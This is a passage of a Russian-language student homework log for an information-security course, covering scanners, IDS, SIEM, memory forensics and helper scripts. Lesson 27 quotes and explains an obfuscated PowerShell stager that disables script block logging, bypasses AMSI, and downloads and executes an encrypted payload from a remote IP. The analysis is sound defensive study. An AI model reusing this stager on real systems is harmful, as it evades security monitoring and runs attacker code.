 Для проверки на уязвимости был выбран сканер [https://github.com/quay/clair](https://github.com/quay/clair) по причине более понятных мануалов по установке и использованию
 
  Установка [https://aquasecurity.github.io/trivy/v0.55/getting-started/installation/](https://aquasecurity.github.io/trivy/v0.55/getting-started/installation/)

 ```bash

 sudo apt-get install wget apt-transport-https gnupg

 wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | gpg --dearmor | sudo tee /usr/share/keyrings/trivy.gpg > /dev/null

 echo "deb [signed-by=/usr/share/keyrings/trivy.gpg] https://aquasecurity.github.io/trivy-repo/deb generic main" | sudo tee -a /etc/apt/sources.list.d/trivy.list

 sudo apt-get update

 sudo apt-get install trivy

 ```
 Пример использования

 ```bash

 sudo trivy image ubuntu:18.04

 ```
 
 Проверка на наличие уязвимостей docker image ubuntu:18.04

 ![ubuntu:18.04](/Lesson_17/%D0%94%D0%97_17_5_1.png)

 Проверка на наличие уязвимостей docker image juice shop

 ![juice_shop_1](/Lesson_17/%D0%94%D0%97_17_5_2.png)

 ![juice_shop_2](/Lesson_17/%D0%94%D0%97_17_5_3.png)

___
> Пишем Dockerfile
___

 [Создание Dockerfile ](https://admin812.ru/kak-sozdat-obraz-docker-s-pomoshhyu-dockerfile-v-ubuntu-20-04-lts.html)

 [Настройка конфигурации nginx](https://serverspace.ru/support/help/ustanovka-i-zapusk-nginx-v-docker-kontejnere-na-ubuntu/?utm_source=google.com&utm_medium=organic&utm_campaign=google.com&utm_referrer=google.com)

 Результат:

 ![Nginx](/Lesson_17/%D0%94%D0%97_17_6_1.png)

</details>


<details><summary>Занятие №18 Защита инфраструктуры приложений</summary>

___
> Установить 2FA на linux (Google authenticator)
___

 [Мануал настройки Google Authenticator](https://www.linuxbabe.com/ubuntu/two-factor-authentication-ssh-key-ubuntu)

 ![2FA](/Lesson_18/%D0%94%D0%97%2018_1.jpg)

 
 ___
> Online песочница any.run
___
 
 ![any.run](/Lesson_18/%D0%94%D0%97%2018_2.jpg)

 
</details>



<details><summary>Занятие №19 Основные виды СЗИ</summary>

___
> Установить антивирус ClamAV
___


 Cлайды 45-48

 [Мануал ClamAV](/Lesson_19/19_szi.pdf)
 
 ![ClamAV](/Lesson_19/%D0%94%D0%97_19_1.png)

___
> Установить YARA
___
 
 [Мануал по установке YARA](https://yara.readthedocs.io/en/latest/gettingstarted.html)

 [Мануал по запуску YARA](https://yara.readthedocs.io/en/stable/commandline.html)

 ![YARA_target](/Lesson_19/%D0%94%D0%97_19_2_1.png)
 
 ![YARA_rule_&_scan](/Lesson_19/%D0%94%D0%97_19_2_2.png)

___
> Установить WAF (nginx + Modsecurity)
___
 
 [Мануал по настройке WAF Modsecurity+Nginx](https://www.linuxbabe.com/security/modsecurity-nginx-debian-ubuntu)

 В мануале ниже на моменте настройки конфига nginx (/etc/nginx/nginx.conf) необходимо выполнить пятый этап из мануала выше.

 [Мануал по настройке WAF Modsecurity+Nginx](https://github.com/sm1lexops/Profile_challenges?tab=readme-ov-file#5-%D0%BF%D1%80%D0%B5%D0%B4%D0%BB%D0%BE%D0%B6%D0%B8%D1%82%D0%B5-%D1%81%D1%85%D0%B5%D0%BC%D1%83-%D0%B8%D0%BD%D1%82%D0%B5%D0%B3%D1%80%D0%B0%D1%86%D0%B8%D0%B8-web-application-firewall-waf-%D0%B2-%D0%B8%D0%BD%D1%84%D1%80%D0%B0%D1%81%D1%82%D1%80%D1%83%D0%BA%D1%82%D1%83%D1%80%D0%B5-%D0%BD%D0%B0%D0%BF%D0%B8%D1%88%D0%B8%D1%82%D0%B5-%D0%BA%D0%BE%D0%BD%D1%84%D0%B8%D0%B3%D1%83%D1%80%D0%B0%D1%86%D0%B8%D1%8E-%D0%B4%D0%BB%D1%8F-%D0%B2%D0%BD%D0%B5%D0%B4%D1%80%D0%B5%D0%BD%D0%B8%D1%8F-waf-%D0%BD%D0%B0%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-modsecurity-%D0%B2-nginx-%D0%BD%D0%B0%D0%BF%D0%B8%D1%88%D0%B8%D1%82%D0%B5-%D0%BA%D0%BE%D0%BD%D0%BA%D1%80%D0%B5%D1%82%D0%BD%D1%8B%D0%B5-%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80%D1%8B-%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D0%BB-%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D0%B8-%D0%BA%D0%BE%D1%82%D0%BE%D1%80%D1%8B%D0%B5-%D0%B2%D1%8B-%D0%B1%D1%8B-%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D0%BD%D0%B8%D0%BB%D0%B8-%D0%B2-waf-%D0%BD%D0%B0%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-%D1%84%D0%B8%D0%BB%D1%8C%D1%82%D1%80%D0%B0%D1%86%D0%B8%D1%8F-sql-%D0%B8%D0%BD%D1%8A%D0%B5%D0%BA%D1%86%D0%B8%D0%B9-xss-%D0%B0%D1%82%D0%B0%D0%BA-%D0%B1%D0%BB%D0%BE%D0%BA%D0%B8%D1%80%D0%BE%D0%B2%D0%BA%D0%B0-%D0%B7%D0%B0%D0%B4%D0%B0%D0%BD%D0%BD%D1%8B%D1%85-%D0%BF%D0%B0%D1%82%D1%82%D0%B5%D1%80%D0%BD%D0%BE%D0%B2)

 ![Результат](/Lesson_19/waf%20nginx.PNG)

</details>


<details><summary>Занятие №20 Основные виды СЗИ </summary>

___
> Установка и тестирование Suricata IDS
___

 [Мануал установки и настройки Suricata (стр. 23-39)](/Lesson_20/20_SZI.pdf)

 [Git с правилами на детектирование разных режимов работы сетевого сканера nmap](https://github.com/aleksibovellan/opnsense-suricata-nmaps)

 Конфиг suricata (/etc/suricata/suricata.yaml)

 ![suricata.yaml_1](/Lesson_20/%D0%94%D0%97_20_yaml_1.png)

 ![suricata.yaml_2](/Lesson_20/%D0%94%D0%97_20_yaml_2.png)

 Кастомные правила для определения работы nmap

 ![local.rules](/Lesson_20/%D0%94%D0%97_20_rules_1.png)

 Лог сработки правила (/var/log/suricata/fast.log)

 ![local.rules](/Lesson_20/%D0%94%D0%97_20_log_1.png)
___
> Тест работы fail2ban
___
 
 [Мануал установки и настройки Suricata (стр. 13-16)](/Lesson_20/20_SZI.pdf)

 Логи fail2ban (блокировка по умолчанию осуществляется на 10 минут) /var/log/fail2ban.log

 ![fail2ban.log_1](/Lesson_20/%D0%94%D0%97_20_f2b_1.png)

 ![fail2ban.log_2](/Lesson_20/%D0%94%D0%97_20_f2b_2.png)

 Брутфорс при помощи Hydra до начала работы fail2ban и после начала работы fail2ban

 ![Hydra до](/Lesson_20/%D0%94%D0%97_20_h_1.png)

 ![Hydra после](/Lesson_20/%D0%94%D0%97_20_h_2.png)

 Брутфорс при помощи Medusa до начала работы fail2ban и после начала работы fail2ban

 ![Medusa до](/Lesson_20/%D0%94%D0%97_20_m_1.png)

 ![Medusa после](/Lesson_20/%D0%94%D0%97_20_m_2.png)

</details>



<details><summary>Занятие №21 Audit </summary>

___
> Ознакомление с документацией
___

 [NIST standards docs](https://csrc.nist.gov/publications/sp800)

 [OWASP Top Ten](https://owasp.org/www-project-top-ten/)

 [CIS рекомендации](https://www.cisecurity.org/cis-benchmarks)

 [PCI DSS библиотека](https://www.pcisecuritystandards.org/document_library/)

</details>



<details><summary>Занятие №22 Vulnerability Assessment </summary>

___
> Scanner OpenVAS
___

 [Установка OpenVAS Docker compose](https://greenbone.github.io/docs/latest/22.4/container/index.html#)

 [Установка OpenVAS способом компиляции (неполучилось нормально скомпилировать)](https://greenbone.github.io/docs/latest/22.4/source-build/index.html)

 [Готовый образ OpenVAS](https://www.greenbone.net/en/greenbone-free/#toggle-id-1)

 [Мануал по работе с OpenVAS](https://habr.com/ru/articles/203766/)
 
 ![Сканирование_1](/Lesson_22/ДЗ_22_1.png)

 ![Сканирование_2](/Lesson_22/ДЗ_22_5.png)

 ![Уязвимость](/Lesson_22/ДЗ_22_2.png)
 
 Устранение данной уязвимости:
  Програмное решение: 

      - обновить версию ssh

  Административное решение:

       - вход только по сертификату

       - вход только с разрешенных хостов

       - отключить SSH

       - двухфакторная аутентификация


___
> Зарегистрироваться на opencve.io
___
 
 ![OpenCVE_1](/Lesson_22/ДЗ_22_3.png)

 ![OpenCVE_2](/Lesson_22/ДЗ_22_4.png)
___
> Установить PatrOwl
___

 [Мануал по запуску docker версии Partowl ](https://github.com/Patrowl/PatrowlDocs/blob/master/installation/installation-guide.md)

 ![PatrOwl](/Lesson_22/ДЗ_22_6.png)

</details>



<details><summary>Занятие №23 Event Management </summary>

___
> Изучаем на лабораторных стендах Splunk SIEM
___

 Лабораторные работы по анализу логов достаточно простые.

 Для выполнения лабораторных работ по анализу ВПО необходимо больше практики в обращении с инструментами анализа ПО.

 ![Лабы](/Lesson_23/ДЗ_23_1.png)

___
> Установка EFK стэка с помощью docker-compose
___
 
Не получилось поднять ELK стэк так как не хочет подниматься контейнер с коннектором fluent. Точнее по какой-то причине не устанавливается fluent-plugin-elasticsearch.

Были испробованы:
  
  - использование VPN
  - различные конфиги установки (как из обычных мануалов, так и из сгенерированных AI)
  - различные docker image (как официальные fluent, так и кастомные под ELK стэк)

Вместо EFK был развернут ELK 

[Мануал по запуску Docker compose ELK](https://www.elastic.co/blog/getting-started-with-the-elastic-stack-and-docker-compose)

![Результат](/Lesson_23/ДЗ_23_2.png)

!Решение проблемы найдено. EFK заработал.

[Мануал](https://www.howtoforge.com/how-to-set-up-an-elasticsearch-fluentd-and-kibana-efk-logging-stack-on-ubuntu-22-04/)

Необходимые изменения в Dockerfile fluent 

```docker

FROM fluent/fluentd:v1.14-1

USER root

RUN gem update --system && \
gem install fluent-plugin-elasticsearch --source http://rubygems.org

```

[Источник решения](https://stackoverflow.com/questions/71120621/efk-system-is-build-on-docker-but-fluentd-cant-start-up)

![Результат](/Lesson_23/ДЗ_23_elk.png)

___
> Установка SIEM Wazuh с помощью docker-compose
___

[Мануал по запуску Docker compose Wazuh (single node)](https://documentation.wazuh.com/current/deployment-options/docker/docker-installation.html)

Времени на полную развертку Wazuh пока не было, но на курсах НЦОТ выполняли установку wazuh + win/linux агенты, написание правил корреляции, интеграция с Hive + оповещение об инцедентах высокого уровня на электронную почту.

![Wazuh](/Lesson_23/ДЗ_23_Wazuh.png)

</details>



<details><summary>Занятие №24-25 Forensics, Incident response </summary>

___
> Изучить основные виды HTTP methods and requests
___

 [Основные виды HTTP methods and requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)

 ___
> Установить volatility на ubuntu
___
 
 AVML необходим для создания файла дампа памяти. Volatility для работы с файлом дампа памяти.

 [Мануал Volatility+AVML](https://docs.google.com/document/d/1v7u6HVrae1R4fCCs1SNAGryjy5tmJCPDKq2Hyhqd9Fo/edit?pli=1&tab=t.0)

 [Мануал по получению таблицы символов на Ubuntu](https://www.iblue.team/memory-forensics-1/volatility-plugins/build-custom-linux-profile-for-volatility)

 !Важно. Скопировать полученный json файл необходимо в /путь к папке/volatility3/volatility3/symbols/linux/ папки linux по умолчанию нет, ее надо создать. То есть в клонированном репозитории необходимо зайти в одноименную папку volatility3 и уже в ней искать папку symbols.

 ![Результат](/Lesson_24_25/ДЗ_25_vol.png)

</details>


<details><summary>Занятие №26 Scripting pt.1 </summary>

___
> Написать красочный интерактивный bash-script для автоматизации ваших часто повторяемых действий 
___

Был написан скрипт установки и запуска volatility3 с возможностью выбора системы Ubuntu или Debian.

[Main](/Lesson_26/main)

[Ubuntu](/Lesson_26/ubuntu)

[Debian](/Lesson_26/debian)

Скрипты размещаются в домашнюю директорию пользователя (~) и запускаются из нее же.

Main - обновляет систему; проверяет наличие и устанавливает в случае необходимости приложения wget, python, git; дает возможность выбора варианта установки volatility в зависимости от системы.

Ubuntu - устанавиливает avml, dwarf2json, volatility3; снимает дамп памяти; создает символьную таблицу и размещает ее внутри директории volotility3; дает возможность выбрать модуль первого сканирования дампа памяти.

Debian - устанавиливает avml, dwarf2json, volatility3; снимает дамп памяти; создает символьную таблицу и размещает ее внутри директории volotility3; дает возможность выбрать модуль первого сканирования дампа памяти.

Main
``` bash

#!/usr/bin/env bash

RED='\e[31m'
GREEN='\e[32m'
BLUE='\e[34m'
RESET='\e[0m'

echo -e "$BLUE Welcome to install Volatility3 $RESET"
sudo apt-get update >/dev/null

if dpkg -l python3-full >/dev/null
then echo -e "$GREEN Already installed python3-full $RESET"
else sudo apt-get install -y pyton3-full
fi

if dpkg -l python3-pip >/dev/null
then echo -e "$GREEN Already installed python3-pip $RESET"
else sudo apt-get install -y pyton3-pip
fi

if dpkg -l wget >/dev/null
then echo -e "$GREEN Already installed wget $RESET"
else sudo apt-get install -y wget 
fi

if dpkg -l git >/dev/null
then echo -e "$GREEN Already installed git $RESET"
else sudo apt-get install -y git 
fi

if dpkg -l golang-go >/dev/null
then echo -e "$GREEN Already installed golang-go $RESET"
else sudo apt-get install -y golang-go 
fi

PS3='Select system for install volatility3: '
sys=("Ubuntu" "Debian" "Exit")
select fav in "${sys[@]}"; do
    case $fav in
        "Ubuntu")
            echo -e  "$GREEN Install volatility3 for ubuntu $RESET"
	    ~/ubuntu
            break
            ;;
        "Debian")
            echo -e "$GREEN Install volatility3 for ubuntu $RESET"
	    ~/debian
            break
            ;;
	"Exit")
	    echo -e "$RED User requested exit $RESET"
	    exit 0
	    ;;
        *) echo -e "$RED invalid option $REPLY $RESET";;
    esac
done

```

Debian
```bash 

#!/usr/bin/env bash

RED='\e[31m'
GREEN='\e[32m'
BLUE='\e[34m'
RESET='\e[0m'


cd ~ 

echo -e "$GREEN Download the latest release of avml $RESET"

wget https://github.com/microsoft/avml/releases/download/v0.14.0/avml

echo -e "$GREEN Make the file executable $RESET"

sudo chmod +x avml


echo -e "$GREEN Move the executable to a directory in /usr/local/bin $RESET"

sudo mv avml /usr/local/bin/

if avml --help >/dev/null
then echo -e "$GREEN AVML is installed $RESET"
else echo -e "$RED AVML is not installed $RESET" && exit 0
fi

echo -e "$GREEN Create memory dump $RESET" 

sudo avml ~/memory.dmp
sudo chown $USER:$USER memory.dmp
sudo chmod 755 memory.dmp


echo -e "$GREEN Install Volatility3 $RESET"

git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3

echo -e "$GREEN Install Volatility3 requirements $RESET"


pip3 install -r requirements-minimal.txt
pip3 install -r requirements.txt

echo -e "$GREEN Install the corresponding debug symbols $RESET"

sudo tee /etc/apt/sources.list.d/debug.list << EOF
deb http://deb.debian.org/debian-debug/ $(lsb_release -cs)-debug main
deb http://deb.debian.org/debian-debug/ $(lsb_release -cs)-proposed-updates-debug main
EOF

sudo apt update
sudo apt install --yes linux-image-$(uname -r)-dbg


echo -e "$GREEN Instal dwarf2json $RESET"
cd 
git clone https://github.com/volatilityfoundation/dwarf2json.git
cd dwarf2json
go build
sudo cp dwarf2json /usr/local/bin/

if dwarf2json --help >/dev/null
then echo -e "$GREEN dwarf2json is installed $RESET"
else echo -e "$RED dwarf2json is not installed $RESET" && exit 0
fi

echo -e "$GREEN Increase swap space $RESET"
sudo fallocate -l 4G /swapfile
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile

cd /usr/lib/debug/boot/
chmod 755 vmlinux-$(uname -r)
chown $USER:$USER vmlinux-$(uname -r)
sudo mkdir ~/volatility3/volatility3/symbols/linux
sudo dwarf2json linux  --elf /usr/lib/debug/boot/vmlinux-$(uname -r) --system-map /boot/System.map-$(uname -r) > Debian-$(uname -r).json
sudo cp ~/Debian-$(uname -r).json ~/volatility3/volatility3/symbols/linux/
cd ~/volatility3

PS3='Select module for volatility3: '
sys=("Lsof" "Pstree" "Bash" "Check_creds" "Exit")
select fav in "${sys[@]}"; do
    case $fav in
        "Lsof")
            echo -e  "$GREEN Lists open files for each processes $RESET"
            sudo python3 vol.py -f ~/memory.dmp linux.lsof.Lsof
           
            ;;
         "Pstree")
            echo -e  "$GREEN Plugin for listing processes in a tree based on their parent process ID $RESET"
            sudo python3 vol.py -f ~/memory.dmp linux.pstree.PsTree
            
            ;;
        "Bash")
            echo -e  "$GREEN Recovers bash command history from memory $RESET"
            sudo python3 vol.py -f ~/memory.dmp linux.bash.Bash
           
            ;;
        "Check_creds")
            echo -e  "$GREEN Lists open files for each processes $RESET"
            sudo python3 vol.py -f ~/memory.dmp linux.check_creds.Check_creds
            
            ;;
        "Exit")
            echo -e "$RED User requested exit $RESET"
            exit 0
            ;;
             *) echo -e "$RED invalid option $REPLY $RESET";;
    esac
done

```

Ubuntu
```bash 

#!/usr/bin/env bash

RED='\e[31m'
GREEN='\e[32m'
BLUE='\e[34m'
RESET='\e[0m'

cd 

echo -e "$GREEN Download the latest release of avml $RESET"

wget https://github.com/microsoft/avml/releases/download/v0.14.0/avml

echo -e "$GREEN Make the file executable $RESET"

sudo chmod +x avml


echo -e "$GREEN Move the executable to a directory in /usr/local/bin $RESET"

sudo mv avml /usr/local/bin/

if avml --help >/dev/null
then echo -e "$GREEN AVML is installed $RESET"
else echo -e "$RED AVML is not installed $RESET" && exit 0
fi

echo -e "$GREEN Create memory dump $RESET" 

sudo avml ~/memory.dmp
sudo chown $USER:$USER memory.dmp
sudo chmod 755 memory.dmp


echo -e "$GREEN Install Volatility3 $RESET"

git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3

echo -e "$GREEN Install Volatility3 requirements $RESET"


pip3 install -r requirements-minimal.txt
pip3 install -r requirements.txt

echo -e "$GREEN Install the corresponding debug symbols $RESET"

release=$(lsb_release -cs)

sudo tee /etc/apt/sources.list.d/ddebs.list <<EOF

deb http://ddebs.ubuntu.com $release main restricted universe multiverse
deb http://ddebs.ubuntu.com $release-updates main restricted universe multiverse
deb http://ddebs.ubuntu.com $release-proposed main restricted universe multiverse


EOF

wget -O - http://ddebs.ubuntu.com/dbgsym-release-key.asc | sudo apt-key add -


sudo apt update
sudo apt install linux-image-$(uname -r)-dbgsym

# Debug kernel is at: /usr/lib/debug/boot/vmlinux-$(uname -r)
echo -e "$GREEN Instal dwarf2json $RESET"
cd 
git clone https://github.com/volatilityfoundation/dwarf2json.git
cd dwarf2json
go build
sudo cp dwarf2json /usr/local/bin/
if dwarf2json --help >/dev/null
then echo -e "$GREEN dwarf2json is installed $RESET"
else echo -e "$RED dwarf2json is not installed $RESET" && exit 0
fi


cd /usr/lib/debug/boot/
chmod 755 vmlinux-$(uname -r)
chown $USER:$USER vmlinux-$(uname -r)
sudo mkdir ~/volatility3/volatility3/symbols/linux
sudo dwarf2json linux  --elf /usr/lib/debug/boot/vmlinux-$(uname -r) --system-map /boot/System.map-$(uname -r) > ~/Ubuntu-$(uname -r).json
sudo cp ~/Ubuntu-$(uname -r).json ~/volatility3/volatility3/symbols/linux/
cd ~/volatility3

PS3='Select module for volatility3: '
sys=("Lsof" "Pstree" "Bash" "Check_creds" "Exit")
select fav in "${sys[@]}"; do
    case $fav in
        "Lsof")
            echo -e  "$GREEN Lists open files for each processes $RESET"
            sudo python3 vol.py -f ~/memory.dmp linux.lsof.Lsof
           
            ;;
         "Pstree")
            echo -e  "$GREEN Plugin for listing processes in a tree based on their parent process ID $RESET"
            sudo python3 vol.py -f ~/memory.dmp linux.pstree.PsTree
            
            ;;
        "Bash")
            echo -e  "$GREEN Recovers bash command history from memory $RESET"
            sudo python3 vol.py -f ~/memory.dmp linux.bash.Bash
            
            ;;
        "Check_creds")
            echo -e  "$GREEN Lists open files for each processes $RESET"
            sudo python3 vol.py -f ~/memory.dmp linux.check_creds.Check_creds
            
            ;;
        "Exit")
            echo -e "$RED User requested exit $RESET"
            exit 0
            ;;
             *) echo -e "$RED invalid option $REPLY $RESET";;
    esac
done

```
 
___
> Написать powershell-script
___
 
Скрипт. который подключается по протоколу SMB к виртуальным машинам и копирует отфильтрованные журналы в одно место для анализа, передачи или сохранения.

```powershell

#массив с именами хостов, с которых необходимо снять лог-файлы.
 
$files = 'PROGRAMMERS-01', 'PROGRAMMERS-03', 'PROGRAMMERS-04', 'PROGRAMMERS-05', 'PROGRAMMERS-06', 'PROGRAMMERS-07', 'PROGRAMMERS-08', 'PROGRAMMERS-09', 'PROGRAMMERS-10', 'PROGRAMMERS-11', 'PROGRAMMERS-12', 'PROGRAMMERS-13', 'PROGRAMMERS-14', 'PROGRAMMERS-15', 'PROGRAMMERS-16', 'PROGRAMMERS-17', 'PROGRAMMERS-18'
 
#рекурсивная функция, которая подставляет значения из массива.
#wevtutil - функция для работы с журналами событий windows. epl - команда для экспорта системных логов. system - название журнала, который необходимо экспортировать
#\\$file\c$\$file.evtx - путь куда экспортируются лог-файл. По неизвестной мне причине скрипт работает только если сохранять лог локально на ту систему с которой снимаются логи.
#/r - параметр, который отвечает за то, чтобы команда отрабатывала на удаленном хосте.
#/q - фильтр запроса.
 
foreach ($file in $files) {
 
wevtutil epl system \\$file\c$\$file.evtx /r:$file /q:*[System[EventID=7045]]
 
}
 

$sourceFilePath = "c$"
$destinationFolderPath = "c$\test"
 
foreach ($file in $files) {
    $sourceFullPath = "\\$file\c$\$file.evtx"
    $destinationFullPath = "\\rakovskaja-13\$destinationFolderPath\$file.evtx"
    Copy-Item -Path $sourceFullPath -Destination $destinationFullPath
}  
 
 
foreach ($file in $files) {
Remove-Item -Path "\\$file\C$\$file.evtx"
 
}

```

</details>



<details><summary>Занятие №27 Scripting, web, python  pt. 2 </summary>

___
> Написать красочный интерактивный python-script для автоматизации ваших часто повторяемых действий, либо парсинга сайта для получения нужной информации
___

Python скрипт для получения информации о погоде с сайта api.open-meteo.com в городе Минске.

[weather_script](/Lesson_27/weather2.py)

```python

import requests
from datetime import datetime, timezone
import sys

# ANSI-коды для цветов
GREEN = '\033[92m'
BLUE = '\033[94m'
RED = '\033[91m'
RESET = '\033[0m'

def get_weather_forecast(latitude, longitude, past_days=10):
    base_url = "https://api.open-meteo.com/v1/forecast"
    params = {
        "latitude": latitude,
        "longitude": longitude,
        "past_days": past_days,
        "hourly": "temperature_2m,relative_humidity_2m,wind_speed_10m"
    }

    try:
        response = requests.get(base_url, params=params, timeout=10)
        response.raise_for_status()  # Вызовет исключение для неуспешных статус-кодов
    except requests.RequestException as e:
        print(f"{RED}Ошибка: Сервер недоступен.{RESET}")
        sys.exit(1)  # Завершаем выполнение скрипта с кодом ошибки

    data = response.json()
    return process_weather_data(data)

def process_weather_data(data):
    hourly_data = data['hourly']
    current_time = datetime.now(timezone.utc)
    
    time_index = hourly_data['time'].index(current_time.strftime("%Y-%m-%dT%H:00"))
    
    current_temp = hourly_data['temperature_2m'][time_index]
    current_humidity = hourly_data['relative_humidity_2m'][time_index]
    current_wind_speed = hourly_data['wind_speed_10m'][time_index]
    
    forecast = f"{BLUE}Текущая погода в Минске:{RESET}\n\n"
    forecast += f"{BLUE}Температура: {GREEN}{current_temp}°C{RESET}\n"
    forecast += f"{BLUE}Относительная влажность: {GREEN}{current_humidity}%{RESET}\n"
    forecast += f"{BLUE}Скорость ветра: {GREEN}{current_wind_speed} м/с{RESET}\n\n"
    
    forecast += f"{BLUE}Прогноз на ближайшие 24 часа:{RESET}\n"
    for i in range(time_index + 1, time_index + 25):
        if i < len(hourly_data['time']):
            time = datetime.fromisoformat(hourly_data['time'][i])
            temp = hourly_data['temperature_2m'][i]
            humidity = hourly_data['relative_humidity_2m'][i]
            wind_speed = hourly_data['wind_speed_10m'][i]
            forecast += f"{time.strftime('%Y-%m-%d %H:00')}: {GREEN}{temp}°C, {humidity}%, {wind_speed} м/с{RESET}\n"
    
    return forecast

# Координаты Минска
latitude = 53.9
longitude = 27.5667

try:
    print(get_weather_forecast(latitude, longitude))
except Exception as e:
    print(f"{RED}Произошла непредвиденная ошибка: {e}{RESET}")
    sys.exit(1)

```

![Результат](/Lesson_27/ДЗ_27_1.png)

___
>	Расписать действия данного powershell
___

![Script](/Lesson_27/ДЗ_25_vol.png)

IF ($PSVersionTAbLE.PSVErsiON.MaJor-ge3) {
Эта строка проверяет версию PowerShell. $PSVersionTable - это автоматическая переменная, содержащая информацию о версии PowerShell. Условие проверяет, является ли основная (Major) версия PowerShell 3 или выше. Если да, выполняется код внутри блока.

$GPF=[REF].AsSemBLY.GETTyPE('System.Management.Automation.Utils')."GETFiel d"('cachedGroupPolicySettings',"N'+'onPublic,Static');
Эта строка использует рефлексию для доступа к скрытому статическому полю 'cachedGroupPolicySettings' в классе System.Management.Automation.Utils. [REF] - это сокращение для System.Reflection.Assembly. Метод GetField используется для получения информации о поле, которое является непубличным (NonPublic) и статическим (Static).

If ($GPF) {
Проверяет, успешно ли получено поле в предыдущей строке. Если $GPF не null, выполняется код внутри блока.

$GPC=$GPF.GEtVaLue($NULL);
Получает значение поля cachedGroupPolicySettings. $NULL передается как параметр, так как это статическое поле и не требует экземпляра объекта.

IF ($GPC['ScriptB'+'lockLogging]) {
Проверяет, существует ли ключ 'ScriptBlockLogging' в полученных настройках групповой политики. Строка разделена на части для усложнения обнаружения.

$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
$GPC['ScriptB'+'lockLogging']['EnableScriptBlockinvocationLogging']=0 }
Эти строки отключают логирование блокировки скриптов и логирование вызовов скриптовых блоков, устанавливая соответствующие значения в 0.

$vAl=[CoLLeCtionS.GENEric.DICtiONARy[striNg,SYstEm.ObjECT]]::nEw();
Создает новый экземпляр словаря (Dictionary), который будет использоваться для хранения настроек. Ключи - строки, значения - объекты.

$Val.ADd('EnableScriptB'+'lockLogging',0);
$VAL.AdD('EnableScriptBlockinvocationLogging',0);
Добавляет в созданный словарь два ключа, оба со значением 0, что соответствует отключению логирования.

$GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShelllS criptB'+'lockLogging']=$VAI
Применяет новые настройки, добавляя их в кэш групповой политики для указанного пути реестра.

} ELSe
[ScriPtBLocK]."GETFieLd"("signatures",'NonPublic,Static').SEtValuE($NULL,(New-OBj eCtColLEctIONs.GENERic.HaShSEt[sTrING]))
Если предыдущие действия не удались, этот код очищает подписи скриптовых блоков, устанавливая для поля "signatures" пустой HashSet.

[ReF].AsSembLY.GetTYpE('System.Management.Automation.AmsiUtils")?{S_)
%(
$_.GetFleID('amsilnitFailed',"NonPublic,Static').SeTValUe($NULL,$True)};
Эти строки пытаются отключить AMSI (Antimalware Scan Interface), устанавливая флаг 'amsiInitFailed' в значение True. Это может позволить обойти антивирусное сканирование.

[ SysteM.NEt .SERvICePolnTMANAgeR]::ExPEcT100COntinUe=0;
Отключает ожидание ответа 100-Continue от сервера при HTTP-запросах.

$WC= New-ObJECtSYstEm.NEt .WEBCLieNT;
Создает новый объект WebClient для выполнения веб-запросов.

Su='Mozilla/5.0(WindowsNT6.1;WOW64;Trident/7.0;rv:11.0)likeGecko';
$wc.HeAdErS.ADD('User-Agent',Su);
Устанавливает пользовательский User-Agent для веб-клиента, маскируясь под Internet Explorer 11.

$Wc.PRoXY=[ SYstem.NEt .WEbRequESt]::DEfAulTWeBProxY;
$wC.ProxY.CRedENTiAls=[ SysTEM.NEt .CrEDeNTialCaCHE]::DEFAULtNeTworKCrEd EnTiaLs;
Настраивает прокси-сервер для веб-клиента, используя системные настройки прокси и учетные данные по умолчанию.

$Script:Proxy=$wc.Proxy;
Сохраняет настройки прокси в глобальную переменную скрипта для возможного дальнейшего использования.

$K=[SYsTEM.Text.ENcodiNg]::ASCII.GETBYtES('99754106633f94d350db34d548d609 1a");
Создает массив байтов из заданной строки, который будет использоваться как ключ для шифрования/дешифрования.

$R={...};
Определяет анонимную функцию (лямбда-выражение) для реализации алгоритма дешифрования (предположительно RC4).

$ser='http://10.6.100.123:80'; $t="/news.p hp';
Устанавливает адрес сервера и путь для загрузки дополнительных данных.

$WC.HeadERS.AdD("Cookie","session=8xD4koAuu7qHah4KQzwZ/kDq40c=");
Добавляет куки к запросу, возможно, для аутентификации на удаленном сервере.

$DAtA=$WC.DoWNloaDDAtA($SER+$T);
Загружает данные с указанного URL.

$IV=$DatA[0…3]; $datA=$DATa[4…$datA.lengT H];
Извлекает первые 4 байта как вектор инициализации (IV) и остальные данные как зашифрованное содержимое.

-join[ChAr[]](&$R$daTA($IV+$K))|IEX
Расшифровывает данные с помощью функции $R, преобразует результат в строку и выполняет его как PowerShell-код с помощью оператора IEX (Invoke-Expression).

Этот скрипт представляет собой сложную вредоносную программу, предназначенную для обхода систем безопасности, загрузки и выполнения дополнительного кода с удаленного сервера. Он использует различные методы обфускации и техники обхода защиты, что делает его крайне опасным.

</details>



<details><summary>Занятие №28 Coding  pt. 1 </summary>

___
> Ознакомиться с основными ресурсами по безопасной разработке
___

[NIST 800-218 Secure Software Development
Framework](https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-218.pdf)

[OWASP Developer Guide](https://owasp.org/www-project-developer-guide/assets/exports/OWASP_Developer_Guide.pdf)

[Top 25 Software Errors](https://www.sans.org/top25-software-errors/)

___
> Установить SSDEEP на Linux
___

[Мануал по установке и работе с SSdeep](https://ssdeep-project.github.io/ssdeep/usage.html)

![ssdeep](/Lesson_28/ДЗ_28_1.png)

</details>



<details><summary>Занятие №29 Coding  pt. 2 </summary>

___
> Ознакомится с информацией и написать скрипты на bash и python для проверки паролей и др
___

Python скрипт для проверки пароля из готового списка

[Password_check](/Lesson_29/password_check.py)

```python

import re

GREEN="\033[32m"
PURPLE="\033[35m"
RED="\033[31m"
RESET="\033[0m"




def check_password(password):
    errors = []

    # Проверка длины пароля
    if not 12 <= len(password) <= 24:
        errors.append("Длина пароля должна быть от 12 до 24 символов")
    
    # Проверка на наличие только английских букв, цифр и символов
